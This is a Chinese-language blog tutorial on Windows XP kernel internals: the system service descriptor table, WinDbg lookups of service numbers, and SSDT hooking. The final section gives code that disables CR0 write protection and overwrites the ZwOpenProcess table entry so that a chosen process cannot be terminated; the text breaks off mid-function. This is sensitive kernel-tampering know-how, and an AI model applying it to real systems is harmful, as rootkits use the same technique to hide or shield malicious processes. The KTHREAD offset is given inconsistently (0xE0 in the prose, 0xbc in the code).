{"title":"SSDT Hook","uid":"6b2dac661e4ecb3d25144597b91ee96f","slug":"SSDT Hook","date":"2022-03-26T11:33:07.000Z","updated":"2025-06-05T12:24:03.458Z","comments":true,"path":"api/articles/SSDT Hook.json","keywords":null,"cover":[],"content":"<p>内核态代码只能被用户态的SYSCALL、SYSENTER或INT 0x2E指令来访问</p>\n<p>程序进入0环后，有一个保存现场的过程，会将3环的各种寄存器都保存到一个叫做_Trap_Frame的结构体中。在3环部分，程序将一个编号存到了<strong>eax中</strong>，这个编号叫做<strong>系统服务号</strong>，此外，在保存现场的过程中，程序还让<strong>edx指向了3环第一个参数的地址</strong>。</p>\n<h1 id=\"系统服务表\"><a href=\"#系统服务表\" class=\"headerlink\" title=\"系统服务表\"></a>系统服务表</h1><p>在分析代码前，我们先来学习一个结构，系统服务表（System Service Table）</p>\n<p><img src=\"/post/GitHub%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/%E8%A1%A8/%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E8%A1%A8.png\" alt=\"img\"></p>\n<p>在Windows XP系统下，系统服务表有两张，这两张表存着<strong>内核文件</strong>的导出函数（不包括内核文件的所有函数，主要是3环函数常用的内核函数）。第一张表导出的内核函数主要来源于ntoskrl.exe，实现大部分3环函数基本功能；第二张表导出的内核函数主要来源于win32k.sys，主要实现图形界面相关功能（例如GDI32.dll的底层实现）。</p>\n<h2 id=\"系统服务表结构\"><a href=\"#系统服务表结构\" class=\"headerlink\" title=\"系统服务表结构\"></a>系统服务表结构</h2><p>根据示例图，我们先简单认识一下系统服务表，先从结构看起：</p>\n<ul>\n<li>ServiceTable：指向一个<strong>函数地址表</strong>，通过<strong>系统服务号</strong>可以在函数地址表中找到指定的内核函数。</li>\n<li>Count：指当前系统服务表<strong>被调用的次数</strong>。</li>\n<li>ServiceLimit：函数地址表的大小，即系统服务函数的个数</li>\n<li>ArgmentTable：系统服务函数参数的大小，<strong>以字节为单位</strong>，每个成员大小为1个字节。</li>\n</ul>\n<h2 id=\"系统服务表位置\"><a href=\"#系统服务表位置\" class=\"headerlink\" title=\"系统服务表位置\"></a>系统服务表位置</h2><p>这个系统服务表<strong>位于KTHREAD结构的0xE0</strong>偏移处。这样，在进入0环后我们可以通过fs:[0]找到KPCR结构，然后在KPCR-&gt;0x124找到当前线程的KTHREAD结构，再根据KTHREAD-&gt;0xE0就可以找到当前线程所拥有的系统服务表。（还是要说明一点KTHREAD这个结构体是未文档化的，所以里面的数据随着系统版本的不同各个字段偏移就有可能不同，所以使用前最好用windbg命令<code>dt _KThread </code>确认下所需要的字段偏移。）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fs:[0] -&gt; KPCR -&gt; KPCR+0x124 -&gt; KTHREAD -&gt; KTHREAD+0xE0 -&gt; 系统服务表</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"系统服务号\"><a href=\"#系统服务号\" class=\"headerlink\" title=\"系统服务号\"></a>系统服务号</h2><p>系统服务号用来定位所要寻找的系统服务表的函数。</p>\n<p><img src=\"/post/GitHub%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/%E8%A1%A8/%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%8F%B7.png\"></p>\n<p>系统服务号只有低13位是有用的</p>\n<ul>\n<li>下标12：判断去查服务表，0去查第一张表；1去查第二张表</li>\n<li>下标0~11：函数地址表的索引</li>\n</ul>\n<h1 id=\"SSDT\"><a href=\"#SSDT\" class=\"headerlink\" title=\"SSDT\"></a>SSDT</h1><p>前文提到了，我们可以通过fs找到KPCR，在通过KPCR找到KTHREAD，然后在KTHREAD+0xE0处找到系统服务表，这里再介绍另一种找到系统服务表的办法，通过SSDT。</p>\n<h2 id=\"SSDT-amp-SSDT-Shadow\"><a href=\"#SSDT-amp-SSDT-Shadow\" class=\"headerlink\" title=\"SSDT&amp;SSDT Shadow\"></a>SSDT&amp;SSDT Shadow</h2><p>在Windows内核中设计了两张系统服务描述符表，一张表是上述所说的SSDT，它只保存非用户界面相关的系统服务（例如创建文件、创建进程等）；另一张表称为ShadowSSDT，它专门用于保存和用户界面相关的服务（例如创建窗口等），这两张表在内核中都使用了同一个结构体的表示：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//系统服务表</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">KSYSTEM_SERVICE_TABLE</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    PULONG ServiceTableBase;       <span class=\"comment\">//函数地址表的首地址</span></span><br><span class=\"line\">    PULONG ServiceCounterTableBase;<span class=\"comment\">//函数表中每个函数被调用的次数</span></span><br><span class=\"line\">    ULONG  NumberOfService;        <span class=\"comment\">//服务函数的个数</span></span><br><span class=\"line\">    ULONG  ParamTableBase;         <span class=\"comment\">//参数个数表首地址</span></span><br><span class=\"line\">&#125;KSYSTEM_SERVICE_TABLE;</span><br></pre></td></tr></table></figure>\n\n<p>但实际上系统共有4个系统服务描述符，其中2个就是上述的2张表，另外2个没有被使用，可能是留着将来备用的。他们用如下结构体表示：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//服务描述符</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">KSERVICE_TABLE_DESCRIPTOR</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    KSYSTEM_SERVICE_TABLE ntoskrnl;<span class=\"comment\">//ntoskrnl.exe的服务函数,即SSDT</span></span><br><span class=\"line\">    KSYSTEM_SERVICE_TABLE win32k;  <span class=\"comment\">//win32k.sys的服务函数,即ShadowSSDT</span></span><br><span class=\"line\">    KSYSTEM_SERVICE_TABLE notUsed1;<span class=\"comment\">//暂时没用1</span></span><br><span class=\"line\">    KSYSTEM_SERVICE_TABLE notUsed2;<span class=\"comment\">//暂时没用2</span></span><br><span class=\"line\">&#125;KSERVICE_TABLE_DESCRIPTOR;</span><br></pre></td></tr></table></figure>\n\n<p>SSDT（System Services Descriptor Table）系统服务描述符表，在这个结构中包含4个成员，每个成员都是一个系统服务表的结构体，可以在Windbg中通过dd KeServiceDescriptorTable指令进行查看（在程序中可以直接声明全局变量KeServiceDescriptorTable，从而找到系统服务表。）：</p>\n<p><img src=\"/post/GitHub%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/%E8%A1%A8/KeServiceDescriptorTable.png\"></p>\n<p>我们可以看到第一个成员的ServiceTable，Count，ServiceLimit，ArgmentTable字段，Windows Xp只使用了2张表，所以第三个和第四个成员的位置是空的，此外，由于SSDT第二个成员是未导出的，所以第二个成员的位置也是空的。这里介绍一个新的指令，dd KeServiceDescriptorTableShadow，通过全局变量KeServiceDescriptorTableShadow可以查看两张完整的系统服务表。</p>\n<p><img src=\"/post/GitHub%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/%E8%A1%A8/KeServiceDescriptorTableShadow.png\"></p>\n<p>但是，全局变量<strong>KeServiceDescriptorTableShadow也是未导出的</strong>，在实际写程序时，不能通过直接访问win32k.sys导出的第二张系统服务表的函数地址，因为里面的函数地址都是无效的。原因是，win32k.sys导出的第二张系统服务表<strong>只有在当前进程访问GDI相关的API</strong>时，里面的<strong>函数地址表</strong>才会挂载到物理页上。如果进程没有用到GDI相关的API，那么第二张系统服务表里面的函数地址表就不会挂载到物理内存，那么里面的函数也无效。</p>\n<h2 id=\"内核函数查找\"><a href=\"#内核函数查找\" class=\"headerlink\" title=\"内核函数查找\"></a>内核函数查找</h2><p>有了SSDT表，我们查找3环API对应的内核函数就很简单了，拿3环API函数ReadProcessMemory举例，在进入0环之前，给eax赋值了一个系统服务号0xba（Win XP），那我们就用这个ba来查看这个这个函数在内核的实现。</p>\n<p><img src=\"/post/GitHub%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/%E8%A1%A8/%E5%86%85%E6%A0%B8%E5%87%BD%E6%95%B0%E6%9F%A5%E6%89%BE%E8%BF%87%E7%A8%8B.png\" alt=\"内核函数查找过程.png\"></p>\n<p>通过这张图，可以很清晰的看出来，ReadProcessMemory所实现的功能，在底层是由一个叫做NtReadVirtualMemory完成的。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>API函数的调用过程，从3环进入0环，再到找到对应的内核函数，这部分到这就差不多了，当然，真正的调用过程并没有到此结束，因为调用完0环的函数，总得返回3环呀！只是这部分需要用到APC的知识点，因此这里还不能完整实现。此外，在API函数调用这块，还有个小实验，在SSDT表中追加一个函数地址(NtReadVirtualMemory),自己编写API的3环部分调用这个新增的函数(注意：使用2-9-9-12分页，10-10-12会蓝屏)，就留到后面补上了</p>\n<h1 id=\"函数服务号查找中的问题及解决方案\"><a href=\"#函数服务号查找中的问题及解决方案\" class=\"headerlink\" title=\"函数服务号查找中的问题及解决方案\"></a>函数服务号查找中的问题及解决方案</h1><h2 id=\"Windbg——ReadVirtual-not-properly-sign-extended\"><a href=\"#Windbg——ReadVirtual-not-properly-sign-extended\" class=\"headerlink\" title=\"Windbg——ReadVirtual: not properly sign extended\"></a>Windbg——ReadVirtual: not properly sign extended</h2><p>在使用<a href=\"https://so.csdn.net/so/search?q=Windbg&spm=1001.2101.3001.7020\">Windbg</a>对windows系统进行内核调试时，查看SSDT表某个函数，如NtQuerySystemInformation的函数地址时，提示如下：</p>\n<p>如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0: kd&gt; u 8404a48e</span><br><span class=\"line\">ReadVirtual: 8404a48e not properly sign extended</span><br><span class=\"line\">8404a48e 8bff            mov     edi,edi</span><br><span class=\"line\">8404a490 55              push    ebp</span><br><span class=\"line\">8404a491 8bec            mov     ebp,esp</span><br><span class=\"line\">8404a493 8b5508          mov     edx,dword ptr [ebp+8]</span><br><span class=\"line\">8404a496 83fa53          cmp     edx,53h</span><br><span class=\"line\">8404a499 7f21            jg      nt!NtQuerySystemInformation+0x2e (8404a4bc)</span><br><span class=\"line\">8404a49b 7440            je      nt!NtQuerySystemInformation+0x4f (8404a4dd)</span><br><span class=\"line\">8404a49d 83fa08          cmp     edx,8</span><br></pre></td></tr></table></figure>\n\n<p>1、这个问题是由于你正在尝试反汇编一个使用 32 位地址的内核代码，但你的 windbg 配置成了对 64 位地址进行解码。在 Windows 的 x64 架构上，所有内核模式的地址都是在高位 32 位的地址空间，也就是说，如果一个内核地址是合法的，它的高位应该是全 1 或全 0。所以当你尝试去反汇编一个低位 32 位地址的代码时，windbg 认为这个地址没有被正确地符号扩展，于是就抛出了这个错误。</p>\n<p>解决这个问题的办法是将 32 位的地址扩展为 64 位的地址。假设你的地址是 0x8404a48e，你可以尝试将其扩展为 0xffffffff8404a48e，然后再使用 u 命令进行反汇编。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0: kd&gt; u ffffffff8404a48e</span><br><span class=\"line\">nt!NtQuerySystemInformation:</span><br><span class=\"line\">8404a48e 8bff            mov     edi,edi</span><br><span class=\"line\">8404a490 55              push    ebp</span><br><span class=\"line\">8404a491 8bec            mov     ebp,esp</span><br><span class=\"line\">8404a493 8b5508          mov     edx,dword ptr [ebp+8]</span><br><span class=\"line\">8404a496 83fa53          cmp     edx,53h</span><br><span class=\"line\">8404a499 7f21            jg      nt!NtQuerySystemInformation+0x2e (8404a4bc)</span><br><span class=\"line\">8404a49b 7440            je      nt!NtQuerySystemInformation+0x4f (8404a4dd)</span><br><span class=\"line\">8404a49d 83fa08          cmp     edx,8</span><br></pre></td></tr></table></figure>\n\n<p>2、在WinDbg中打开文件菜单，选择 “Symbol File Path”。加载符号文件：</p>\n<p>在 “Symbol search path” 对话框中，输入以下内容：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">srv*c:\\symbols*https://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure>\n\n<p>这将设置 WinDbg 以从 Microsoft 的 symbol 服务器下载 symbol。符号文件将保存在C:\\symbols目录下。</p>\n<p>点击 “OK” 以关闭对话框。</p>\n<p>在WinDbg命令行中，输入以下命令来重新加载symbols：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.reload /f</span><br></pre></td></tr></table></figure>\n\n<p>然后你应该可以使用 u 命令来反汇编地址了，例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0: kd&gt; u nt!NTCreateFile</span><br><span class=\"line\">nt!NtCreateFile:</span><br><span class=\"line\">8057d330 8bff            mov     edi,edi</span><br><span class=\"line\">8057d332 55              push    ebp</span><br><span class=\"line\">8057d333 8bec            mov     ebp,esp</span><br><span class=\"line\">8057d335 33c0            xor     eax,eax</span><br><span class=\"line\">8057d337 50              push    eax</span><br><span class=\"line\">8057d338 50              push    eax</span><br><span class=\"line\">8057d339 50              push    eax</span><br><span class=\"line\">8057d33a ff7530          push    dword ptr [ebp+30h]</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"使用WinDbg获取SSDT-系统服务描述表的函数服务号-索引\"><a href=\"#使用WinDbg获取SSDT-系统服务描述表的函数服务号-索引\" class=\"headerlink\" title=\"使用WinDbg获取SSDT 系统服务描述表的函数服务号(索引)\"></a>使用WinDbg获取SSDT 系统服务描述表的函数服务号(索引)</h2><p>今天研究了一下午SSDT的东东，最尴尬的是起初我不知道如何获取到SSDT的函数服务号，而这个玩意儿在不同版本的windows是不一样的，后面经过研究还是找到了正确的方法.这里简单的分享一下.</p>\n<p>·  先用个图温习一下Win32API的调用流程吧</p>\n<p>这里以函数QuerySystemInformation为例</p>\n<p> <img src=\"/post/GitHub%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/%E8%A1%A8/%E5%87%BD%E6%95%B0QuerySystemInformation%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B.png\" alt=\"函数QuerySystemInformation调用过程.png\"></p>\n<p>·  使用WinDbg获取SSDT函数表对应的索引</p>\n<p>要知道Ntdll.dll中的Win32 API只是一个外壳而已，当从Ring3进入Ring0的时候会将所需要的SSDT索引放入到寄存器EAX中去，所以我们只需要获取到EAX的内容就可以知道函数对应的服务号了.</p>\n<p>好的，我们开始吧，首先打开你的WinDbg，我们以函数QuerySystemInformation为例，我们输入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0: kd&gt; u nt!ZwQuerySystemInformation</span><br><span class=\"line\">nt!ZwQuerySystemInformation:</span><br><span class=\"line\">83e4b044 b805010000      mov     eax,105h</span><br><span class=\"line\">83e4b049 8d542404        lea     edx,[esp+4]</span><br><span class=\"line\">83e4b04d 9c              pushfd</span><br><span class=\"line\">83e4b04e 6a08            push    8</span><br><span class=\"line\">83e4b050 e855140000      call    nt!KiSystemService (83e4c4aa)</span><br><span class=\"line\">83e4b055 c21000          ret     10h</span><br><span class=\"line\">nt!ZwQuerySystemInformationEx:</span><br><span class=\"line\">83e4b058 b806010000      mov     eax,106h</span><br><span class=\"line\">83e4b05d 8d542404        lea     edx,[esp+4]</span><br></pre></td></tr></table></figure>\n\n<p>看到了吧，mov eax 105h，也就是说我们的服务号是105h.</p>\n<p>但有时候使用<code>u nt!fnction</code>命令查不到，因为0环和三环函数名不一样，如ReadProcessMemory函数三环的函数名未为nt!NtReadVirtualMemory，此时应使用<code>u nt!ZwReadVirtualMemory</code>来查。最完整的方式是通过x32dbg-&gt;符号-&gt;ntdll.dll-&gt;查找function-&gt;双击跳转直到遇到mov easx,num且该命令下面是进入0环的三种方式之一。</p>\n<p>来验证一下，看看是不是函数NtQuerySystemInformation。</p>\n<p>我们先获取到SSDT的地址：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0: kd&gt; dd KeServiceDescriptorTable</span><br><span class=\"line\">83f81b00  83e77e3c 00000000 00000191 83e78484</span><br><span class=\"line\">83f81b10  00000000 00000000 00000000 00000000</span><br><span class=\"line\">83f81b20  779855dd 779855b4 00000000 005e6c07</span><br><span class=\"line\">83f81b30  841e45b8 8414d4f4 83eed107 00000000</span><br><span class=\"line\">83f81b40  83e77e3c 00000000 00000191 83e78484</span><br><span class=\"line\">83f81b50  95266000 00000000 00000339 9526702c</span><br><span class=\"line\">83f81b60  011b4415 0000005d 00000011 00000100</span><br><span class=\"line\">83f81b70  5385d2ba d717548f 00000000 00000000</span><br></pre></td></tr></table></figure>\n\n<p>可以看到SSDT的地址是 83e77e3c</p>\n<p>然后通过服务号计算一下SSDT表中这个服务的位置。</p>\n<p>Address &#x3D; SSDT+4*服务号</p>\n<p>我们得到结果为:0x83e77e3c + 4*0x105 &#x3D; 0x83EC11B0</p>\n<p>可以使用如下命令查看函数地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0: kd&gt; dd 83e77e3c+105*4</span><br><span class=\"line\">83e78250  8404a48e 84083631 84091f0a 84129862</span><br><span class=\"line\">83e78260  84006048 84064f79 840767bd 8407103a</span><br><span class=\"line\">83e78270  840156b2 8401186c 83e53ccc 83ff067e</span><br><span class=\"line\">83e78280  8407cd82 83fb0904 841109ea 840e5cd5</span><br><span class=\"line\">83e78290  8407a922 8410ffb2 83fc0b43 83fc23df</span><br><span class=\"line\">83e782a0  841123ba 840fa3e2 8404a8a7 84042db9</span><br><span class=\"line\">83e782b0  8402ce29 83e8ce1c 8401f579 8401a4cf</span><br><span class=\"line\">83e782c0  840c9289 840b72ac 84112056 840b6dfe</span><br></pre></td></tr></table></figure>\n\n<p>我们得到函数的地址是 8404a48e</p>\n<p>在使用u命令:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0: kd&gt; u 8404a48e    </span><br><span class=\"line\">8404a48e 8bff            mov     edi,edi</span><br><span class=\"line\">8404a490 55              push    ebp</span><br><span class=\"line\">8404a491 8bec            mov     ebp,esp</span><br><span class=\"line\">8404a493 8b5508          mov     edx,dword ptr [ebp+8]</span><br><span class=\"line\">8404a496 83fa53          cmp     edx,53h</span><br><span class=\"line\">8404a499 7f21            jg      nt!NtQuerySystemInformation+0x2e (8404a4bc)</span><br><span class=\"line\">8404a49b 7440            je      nt!NtQuerySystemInformation+0x4f (8404a4dd)</span><br><span class=\"line\">8404a49d 83fa08          cmp     edx,8</span><br><span class=\"line\">0: kd&gt; u ffffffff8404a48e  //如果直接使用地址不显示，则在地址前面加8个f</span><br><span class=\"line\">nt!NtQuerySystemInformation:</span><br><span class=\"line\">8404a48e 8bff            mov     edi,edi</span><br><span class=\"line\">8404a490 55              push    ebp</span><br><span class=\"line\">8404a491 8bec            mov     ebp,esp</span><br><span class=\"line\">8404a493 8b5508          mov     edx,dword ptr [ebp+8]</span><br><span class=\"line\">8404a496 83fa53          cmp     edx,53h</span><br><span class=\"line\">8404a499 7f21            jg      nt!NtQuerySystemInformation+0x2e (8404a4bc)</span><br><span class=\"line\">8404a49b 7440            je      nt!NtQuerySystemInformation+0x4f (8404a4dd)</span><br><span class=\"line\">8404a49d 83fa08          cmp     edx,8</span><br></pre></td></tr></table></figure>\n\n<p>看到了吧，我们成功的找到了函数NtQuerySystemInformation的地址.也就是说我们的服务号是正确的.</p>\n<h1 id=\"SSDT-hook\"><a href=\"#SSDT-hook\" class=\"headerlink\" title=\"SSDT hook\"></a>SSDT hook</h1><p>使用PsGetCurrentThread()函数可获取当前KTHREAD的首地址。<br>但是需要注意的是SSDT表所在的内存页属性是只读，没有写入的权限，所以需要把该地址设置为可写入，这样才能写入自己的函数。<br>我使用的是CR0寄存器关闭只读属性<br>简单介绍下CR0寄存器:<br><img src=\"/post/GitHub%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/%E5%AD%98%E5%99%A8.jpg\" alt=\"img\"><br>可以看到这里使用32位寄存器，而在CR0寄存器中，我们重点关注的是3个标志位：<br>PE ­ 是否启用保护模式,置1则启用。<br>PG ­ 是否使用分页模式, 置1则开启分页模式, 此标志置1时, PE 标志也必须置1,否则CPU报异常。<br><strong>WP</strong> ­ WP为1 时, 不能修改只读的内存页 , WP为0 时, 可以修改只读的内存页。</p>\n<p>所以在进行HOOK时，只要把CR0寄存器中的WP位置为0，就能对内存进行写入操作。<br>操作代码如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//关闭页只读保护</span></span><br><span class=\"line\">__asm</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        push eax;</span><br><span class=\"line\">        mov eax, cr0;</span><br><span class=\"line\">        and eax, ~<span class=\"number\">0x10000</span>;</span><br><span class=\"line\">        mov cr0, eax;</span><br><span class=\"line\">        pop eax;</span><br><span class=\"line\">        ret;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>当然使用完成后要把只读保护属性还回去，不然会引发不可预料的严重后果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//开启页只读保护</span><br><span class=\"line\">__asm</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        push eax;</span><br><span class=\"line\">        mov eax, cr0;</span><br><span class=\"line\">        or eax, 0x10000;</span><br><span class=\"line\">        mov cr0, eax;</span><br><span class=\"line\">        pop eax;</span><br><span class=\"line\">        ret;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>有了以上分析的基础那么现在就可以写安装内核钩子的代码了：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//安装钩子</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">InstallHook</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">//1.获取KTHREAD</span></span><br><span class=\"line\">    PETHREAD pNowThread = PsGetCurrentThread();</span><br><span class=\"line\">    <span class=\"comment\">//2.获取ServiceTable表，该字段偏移为0xbc</span></span><br><span class=\"line\">    g_pServiceTable = (KSERVICE_TABLE_DESCRIPTOR*)</span><br><span class=\"line\">        (*(ULONG*)((ULONG)pNowThread + <span class=\"number\">0xbc</span>));</span><br><span class=\"line\">    <span class=\"comment\">//3.保存hook的旧的函数的地址，0xbe为ZwOpenProcess的调用号</span></span><br><span class=\"line\">    g_OldZwOpenProcess = (FuZwOpenProcess)</span><br><span class=\"line\">        g_pServiceTable-&gt;ntoskrnl.ServiceTableBase[<span class=\"number\">0xbe</span>];</span><br><span class=\"line\">    <span class=\"comment\">//4.关闭页只读保护</span></span><br><span class=\"line\">    ShutPageProtect();</span><br><span class=\"line\">    <span class=\"comment\">//5.写入自己的函数到SSDT表内</span></span><br><span class=\"line\">    g_pServiceTable-&gt;ntoskrnl.ServiceTableBase[<span class=\"number\">0xbe</span>]</span><br><span class=\"line\">        = (ULONG)MyZwOpenProcess;</span><br><span class=\"line\">    <span class=\"comment\">//6.开启页只读保护</span></span><br><span class=\"line\">    OpenPageProtect();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>看一下自己写的MyZwOpenProcess函数，通过对比PID找到要保护的进程，并且是以结束进程权限PROCESS_TERMINATE（0x1）访问时，则修改权限为0使其无法访问。就达到了保护进程的目的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//自写的函数</span><br><span class=\"line\">NTSTATUS NTAPI MyZwOpenProcess(</span><br><span class=\"line\">    _Out_ PHANDLE ProcessHandle,</span><br><span class=\"line\">    _In_ ACCESS_MASK DesiredAccess,</span><br><span class=\"line\">    _In_ POBJECT_ATTRIBUTES ObjectAttributes,</span><br><span class=\"line\">    _In_opt_ PCLIENT_ID ClientId</span><br><span class=\"line\">)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    //当此进程为要保护的进程时，并且是以结束进程权限访问时</span><br><span class=\"line\">    if (ClientId-&gt;UniqueProcess == (HANDLE)g_Pid &amp;&amp;</span><br><span class=\"line\">        DesiredAccess == PROCESS_TERMINATE)</span><br><span class=\"line\">    